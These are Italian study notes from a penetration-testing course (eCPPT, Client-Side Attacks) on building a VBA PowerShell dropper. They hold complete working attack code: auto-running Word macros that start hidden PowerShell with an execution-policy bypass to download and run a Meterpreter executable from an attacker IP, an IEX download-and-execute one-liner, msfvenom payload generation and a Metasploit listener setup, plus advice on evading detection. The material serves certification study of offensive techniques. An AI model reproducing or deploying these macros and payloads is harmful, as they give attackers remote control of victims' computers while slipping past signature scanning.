# 015 — VBA PowerShell Dropper (Client-Side Attacks)

> **Modulo:** Client-Side Attacks · **Video:** 15/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [015_VBA PowerShell Dropper.txt](015_VBA PowerShell Dropper.txt) · [015_VBA PowerShell Dropper.srt](015_VBA PowerShell Dropper.srt)

## Concetti chiave

- **Dropper** = documento/payload che NON dà accesso iniziale di per sé, ma **scarica ed esegue** un secondo stadio (vero implant).
- Vantaggi del dropper VBA+PowerShell: codice macro più piccolo/innocuo, payload reale **non scritto nel doc** → bypass signature scanning, possibilità di cambiare implant senza rigenerare il doc.
- Componenti: **`Invoke-WebRequest`** (download) + **`Start-Process`** (exec) eseguiti via **`Shell powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command`**.
- Triplette di virgolette `"""` in VBA = come includere un singolo `"` in stringa, necessario per costruire dinamicamente comandi PS contenenti virgolette.
- **`vbCrLf`** = costante VBA per `CR+LF`, separa comandi PowerShell multipli in un unico `-Command`.
- **`vbHide`** (=0) nella `Shell()` VBA nasconde la finestra PowerShell durante l'esecuzione.

## Spiegazione approfondita

### Flusso a 2 stadi
1. **Stadio 1 (dropper)**: macro VBA con PowerShell che fa GET del payload da web server attacker e lo esegue.
2. **Stadio 2 (implant)**: il vero `.exe` Meterpreter (o altro) generato con `msfvenom`, ospitato su HTTP server attacker.

### Setup Kali
```bash
# Genera l'implant
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.2.134 LPORT=4444 -f exe -o shell.exe

# Hosting HTTP
python3 -m http.server 8080
```

### Macro dropper completa
```vba
Sub AutoOpen()
    Dropper
End Sub

Sub Document_Open()
    Dropper
End Sub

Sub Dropper()
    ' Variabile URL del web server remoto che hosta il payload
    Dim url As String
    url = "http://192.168.2.134:8080/shell.exe"

    ' Variabile per lo script PowerShell da eseguire
    Dim PSScript As String
    PSScript = "Invoke-WebRequest -Uri """ & url & """ -OutFile ""C:\Users\admin\file.exe""" & vbCrLf & _
               "Start-Process -FilePath ""C:\Users\admin\file.exe"""

    ' Esegue lo script via PowerShell, finestra nascosta
    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & PSScript & """", vbHide
End Sub
```

### Perché le triple-quote `"""`
In VBA, dentro una stringa, per ottenere un singolo `"` devi raddoppiarlo (`""`). Quando però la stringa che stai costruendo deve **già contenere virgolette** (perché il comando PS le richiede attorno a path/URL), e quella stessa stringa è interpolata con la variabile `url`, finisci per scrivere `"""` (= un `"` letterale + chiusura/riapertura della string literal).

Forma generica:
```vba
PS = "... -Uri """ & url & """ -OutFile ""C:\path\file.exe"""
'           ^^^      ^^^         ^^                       ^^^
'           "        "           "                        " (chiude string)
```

### `vbCrLf`
Costante built-in = `Chr(13) & Chr(10)`. Inserisce newline che separano comandi PowerShell quando passati come unica stringa a `-Command`.

### `Shell(...)` vs `WScript.Shell.Run`
- `Shell` è la funzione VBA nativa (intero process ID).
- Secondo argomento = **WindowStyle**: `vbHide`=0, `vbNormalFocus`=1, `vbMinimizedFocus`=2, etc.
- `vbHide` rende invisibile la finestra di PowerShell.

### Listener
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.2.134
set LPORT 4444
run
```

### Cosa vede il difensore
- Sul filesystem: solo il `.doc` con macro innocua (poche righe di VBA), nessun payload binario.
- Network log: GET HTTP 8080 verso IP attacker → fingerprint del dropper. Mitigabile con HTTPS / dominio compromesso.

## Comandi & strumenti

| Elemento | Sintassi |
|---|---|
| Gen implant | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=… -f exe -o shell.exe` |
| HTTP server | `python3 -m http.server 8080` |
| PS download | `Invoke-WebRequest -Uri <url> -OutFile <path>` |
| PS exec | `Start-Process -FilePath <path>` |
| PS bypass policy | `-ExecutionPolicy Bypass -WindowStyle Hidden -Command "..."` |
| VBA exec hidden | `Shell "powershell.exe ... ", vbHide` |
| Triple quote | `"""` = un `"` dentro string literal interpolata |
| Multi-command separator | `vbCrLf` |

## Esempi pratici

```vba
' Versione minimal con concatenazione PS one-liner
Sub Document_Open()
    Dim u As String: u = "http://10.0.0.5:8080/p.exe"
    Dim p As String
    p = "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/i.ps1')"
    Shell "powershell -nop -w hidden -ep bypass -c """ & p & """", vbHide
End Sub
```

```bash
# Kali side, all-in-one
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o /tmp/p.exe
cd /tmp && python3 -m http.server 8080 &
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/meterpreter/reverse_tcp; \
  set LHOST 10.0.0.5; set LPORT 4444; run"
```

## Punti d'attenzione per l'esame eCPPT

- **Dropper** = primo stadio che scarica/esegue, NON contiene l'implant.
- Sequenza canonica VBA dropper: `Document_Open` → `Shell powershell.exe ... -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IWR + Start-Process"`.
- **Triple quote `"""`** in VBA = singolo carattere `"` quando si costruiscono stringhe con virgolette interne.
- **`vbCrLf`** = newline per concatenare più comandi PS in singolo `-Command`.
- **`vbHide`** (parametro `Shell`) = nasconde la finestra PS.
- Path di drop tipico: `C:\Users\<user>\`, `%TEMP%`, `C:\ProgramData\` (writable, no admin).
- Vantaggio OPSEC vs MSF puro: macro **piccola e generica**, swap payload server-side senza re-build doc.
- **`Invoke-WebRequest`** = cmdlet PS standard, alias `iwr`/`curl`/`wget` in PS Core.

## Collegamenti con altri video

- Precedente: [[014_Weaponizing VBA Macros with MSF]]
- Prossimo: [[016_VBA Reverse Shell Macro with Powercat]] — niente file su disco, in-memory.
- Approfondimento PS: modulo **PowerShell for Pentesters**.
- Automazione dropper: [[021_Automating Macro Development with MacroPack - Part 1]] (`-t dropper`).
- Smuggling consegna: [[023_File Smuggling with HTML & JavaScript]].
